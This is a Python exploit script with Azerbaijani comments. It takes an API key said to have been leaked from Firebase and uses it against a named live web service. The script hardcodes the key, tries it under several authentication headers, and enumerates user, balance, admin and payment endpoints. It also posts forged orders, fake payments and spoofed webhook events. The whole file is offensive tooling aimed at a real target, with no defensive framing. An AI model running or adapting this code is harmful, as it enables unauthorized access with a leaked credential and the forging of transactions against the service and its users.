#!/usr/bin/env python3
# 🔑 API Açarı ilə Tam Exploit Script
# Firebase-dən tapılan API açarı: 31de456b79594d98a128c044c509df0e

import requests
import json
import time
from urllib.parse import urljoin

class APIKeyExploiter:
    def __init__(self):
        self.api_key = "31de456b79594d98a128c044c509df0e"
        self.base_url = "https://peakerr.com"
        self.api_url = "https://peakerr.com/api"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
    def test_api_key_operations(self):
        print("🔑 API Açarı ilə Tam Exploit Başladıldı!")
        print(f"📋 API Açarı: {self.api_key}")
        print(f"🌐 Base URL: {self.base_url}")
        print("=" * 60)
        
        # 1. API Endpoint-ləri Test Et
        self.test_api_endpoints()
        
        # 2. Authentication Test Et
        self.test_authentication()
        
        # 3. User Info Test Et
        self.test_user_info()
        
        # 4. Balance Test Et
        self.test_balance()
        
        # 5. Services Test Et
        self.test_services()
        
        # 6. Orders Test Et
        self.test_orders()
        
        # 7. Followers Test Et
        self.test_followers()
        
        # 8. Admin Panel Test Et
        self.test_admin_panel()
        
        # 9. Payment Test Et
        self.test_payment()
        
        # 10. Webhook Test Et
        self.test_webhooks()
        
        print("\n🎯 API Açarı Exploit Tamamlandı!")

    def test_api_endpoints(self):
        print("\n1️⃣ API Endpoint-ləri Test Edilir...")
        
        endpoints = [
            "/api/v1/",
            "/api/v2/",
            "/api/v3/",
            "/api/",
            "/v1/",
            "/v2/",
            "/v3/",
            "/rest/",
            "/graphql",
            "/soap/"
        ]
        
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=10)
                print(f"   🌐 {endpoint}: {response.status_code} - {len(response.content)} bytes")
                if response.status_code == 200 and len(response.content) > 0:
                    print(f"      📄 Content: {response.text[:100]}...")
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_authentication(self):
        print("\n2️⃣ Authentication Test Edilir...")
        
        auth_methods = [
            {"header": "Authorization", "value": f"Bearer {self.api_key}"},
            {"header": "X-API-Key", "value": self.api_key},
            {"header": "api_key", "value": self.api_key},
            {"header": "key", "value": self.api_key},
            {"header": "token", "value": self.api_key},
            {"header": "access_token", "value": self.api_key}
        ]
        
        test_urls = [
            "/api/user",
            "/api/profile",
            "/api/account",
            "/api/auth",
            "/api/me"
        ]
        
        for method in auth_methods:
            print(f"\n   🔐 {method['header']}: {method['value'][:20]}...")
            for url in test_urls:
                full_url = urljoin(self.base_url, url)
                try:
                    headers = {method['header']: method['value']}
                    response = self.session.get(full_url, headers=headers, timeout=10)
                    print(f"      🌐 {url}: {response.status_code}")
                    if response.status_code == 200:
                        print(f"         ✅ Uğurlu! Content: {response.text[:100]}...")
                    elif response.status_code == 401:
                        print(f"         🔒 Unauthorized - API açarı düzgün deyil")
                    elif response.status_code == 403:
                        print(f"         🚫 Forbidden - API açarı var amma yetki yoxdur")
                except Exception as e:
                    print(f"      ❌ {url}: Xəta - {e}")

    def test_user_info(self):
        print("\n3️⃣ User Info Test Edilir...")
        
        user_endpoints = [
            "/api/user",
            "/api/profile",
            "/api/account",
            "/api/me",
            "/api/dashboard",
            "/api/settings"
        ]
        
        for endpoint in user_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                # Fərqli header-lər ilə test et
                headers = {
                    "X-API-Key": self.api_key,
                    "Authorization": f"Bearer {self.api_key}",
                    "api_key": self.api_key
                }
                
                for header_name, header_value in headers.items():
                    response = self.session.get(url, headers={header_name: header_value}, timeout=10)
                    print(f"   🌐 {endpoint} ({header_name}): {response.status_code}")
                    
                    if response.status_code == 200:
                        print(f"      ✅ Uğurlu! User məlumatları tapıldı!")
                        try:
                            data = response.json()
                            print(f"         📊 JSON Data: {json.dumps(data, indent=2)[:200]}...")
                        except:
                            print(f"         📄 HTML Content: {response.text[:200]}...")
                        break
                    elif response.status_code == 401:
                        print(f"      🔒 Unauthorized")
                    elif response.status_code == 403:
                        print(f"      🚫 Forbidden")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_balance(self):
        print("\n4️⃣ Balance Test Edilir...")
        
        balance_endpoints = [
            "/api/balance",
            "/api/wallet",
            "/api/funds",
            "/api/credit",
            "/api/account/balance"
        ]
        
        for endpoint in balance_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   💰 {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Balance məlumatları tapıldı!")
                    try:
                        data = response.json()
                        print(f"         💵 Balance: {json.dumps(data, indent=2)}")
                    except:
                        print(f"         📄 Content: {response.text[:200]}...")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_services(self):
        print("\n5️⃣ Services Test Edilir...")
        
        service_endpoints = [
            "/api/services",
            "/api/categories",
            "/api/products",
            "/api/offerings"
        ]
        
        for endpoint in service_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   🛍️ {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Services məlumatları tapıldı!")
                    try:
                        data = response.json()
                        print(f"         📋 Services Count: {len(data) if isinstance(data, list) else 'N/A'}")
                        print(f"         📊 Data: {json.dumps(data, indent=2)[:300]}...")
                    except:
                        print(f"         📄 Content: {response.text[:300]}...")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_orders(self):
        print("\n6️⃣ Orders Test Edilir...")
        
        order_endpoints = [
            "/api/orders",
            "/api/orders/create",
            "/api/orders/new",
            "/api/order/create"
        ]
        
        for endpoint in order_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                
                # GET request
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   📦 {endpoint} (GET): {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Orders məlumatları tapıldı!")
                    try:
                        data = response.json()
                        print(f"         📋 Orders Count: {len(data) if isinstance(data, list) else 'N/A'}")
                    except:
                        print(f"         📄 Content: {response.text[:200]}...")
                
                # POST request - fake order yaratmağa çalış
                fake_order_data = {
                    "service": "instagram_followers",
                    "link": "https://instagram.com/test",
                    "quantity": 100,
                    "api_key": self.api_key
                }
                
                response = self.session.post(url, headers=headers, json=fake_order_data, timeout=10)
                print(f"   📦 {endpoint} (POST): {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Fake order yaradıldı!")
                    try:
                        data = response.json()
                        print(f"         📊 Response: {json.dumps(data, indent=2)}")
                    except:
                        print(f"         📄 Content: {response.text[:200]}...")
                elif response.status_code == 400:
                    print(f"      ⚠️ Bad Request - Data formatı düzgün deyil")
                elif response.status_code == 401:
                    print(f"      🔒 Unauthorized")
                elif response.status_code == 403:
                    print(f"      🚫 Forbidden")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_followers(self):
        print("\n7️⃣ Followers Test Edilir...")
        
        follower_endpoints = [
            "/api/followers",
            "/api/instagram/followers",
            "/api/social/followers",
            "/api/smm/followers"
        ]
        
        for endpoint in follower_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   👥 {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Followers məlumatları tapıldı!")
                    try:
                        data = response.json()
                        print(f"         📊 Data: {json.dumps(data, indent=2)[:300]}...")
                    except:
                        print(f"         📄 Content: {response.text[:300]}...")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_admin_panel(self):
        print("\n8️⃣ Admin Panel Test Edilir...")
        
        admin_endpoints = [
            "/admin",
            "/admin/",
            "/admin/dashboard",
            "/admin/users",
            "/admin/orders",
            "/admin/services",
            "/admin/settings",
            "/admin/api",
            "/api/admin",
            "/api/admin/users",
            "/api/admin/orders"
        ]
        
        for endpoint in admin_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   👑 {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Admin panel tapıldı!")
                    print(f"         📄 Content: {response.text[:200]}...")
                elif response.status_code == 403:
                    print(f"      🚫 Forbidden - Admin yetkisi yoxdur")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_payment(self):
        print("\n9️⃣ Payment Test Edilir...")
        
        payment_endpoints = [
            "/api/payment",
            "/api/pay",
            "/api/addfunds",
            "/api/deposit",
            "/api/credit/add"
        ]
        
        for endpoint in payment_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                
                # GET request
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   💳 {endpoint} (GET): {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Payment səhifəsi tapıldı!")
                    print(f"         📄 Content: {response.text[:200]}...")
                
                # POST request - fake payment
                fake_payment_data = {
                    "amount": 10.00,
                    "currency": "USD",
                    "method": "credit_card",
                    "api_key": self.api_key
                }
                
                response = self.session.post(url, headers=headers, json=fake_payment_data, timeout=10)
                print(f"   💳 {endpoint} (POST): {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Payment uğurlu!")
                    try:
                        data = response.json()
                        print(f"         📊 Response: {json.dumps(data, indent=2)}")
                    except:
                        print(f"         📄 Content: {response.text[:200]}...")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

    def test_webhooks(self):
        print("\n🔟 Webhook Test Edilir...")
        
        webhook_endpoints = [
            "/api/webhook",
            "/api/callback",
            "/api/notify",
            "/webhook",
            "/callback"
        ]
        
        for endpoint in webhook_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {"X-API-Key": self.api_key}
                
                # GET request
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"   🔗 {endpoint} (GET): {response.status_code}")
                
                # POST request - fake webhook
                fake_webhook_data = {
                    "event": "order_completed",
                    "order_id": "12345",
                    "status": "completed",
                    "api_key": self.api_key
                }
                
                response = self.session.post(url, headers=headers, json=fake_webhook_data, timeout=10)
                print(f"   🔗 {endpoint} (POST): {response.status_code}")
                
                if response.status_code == 200:
                    print(f"      ✅ Webhook uğurlu!")
                    try:
                        data = response.json()
                        print(f"         📊 Response: {json.dumps(data, indent=2)}")
                    except:
                        print(f"         📄 Content: {response.text[:200]}...")
                        
            except Exception as e:
                print(f"   ❌ {endpoint}: Xəta - {e}")

if __name__ == "__main__":
    exploiter = APIKeyExploiter()
    exploiter.test_api_key_operations()